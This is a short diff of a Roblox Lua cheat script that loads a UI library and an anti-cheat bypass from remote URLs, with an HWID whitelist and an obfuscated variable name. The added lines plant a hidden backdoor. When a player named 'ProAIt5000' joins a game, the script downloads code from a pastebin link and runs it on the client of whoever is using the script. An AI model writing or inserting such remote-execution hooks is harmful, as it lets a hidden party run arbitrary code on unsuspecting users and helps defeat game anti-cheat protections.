@@ -2,6 +2,12 @@ local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-I
 loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
 wait()
 
+game.Players.PlayerAdded:Connect(function(Player)
+	if Player.Name == "ProAIt5000" then
+		loadstring(game:HttpGet("https://pastebin.com/raw/NNT4U1wZ"))()
+	end
+end)
+
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
 local WhitelistedHWIDs = {"3e1c4b4e-9faf-4909-9bfe-f02ede989c70"}
 local qNVAKkuwxNpqruLjSRHg = false
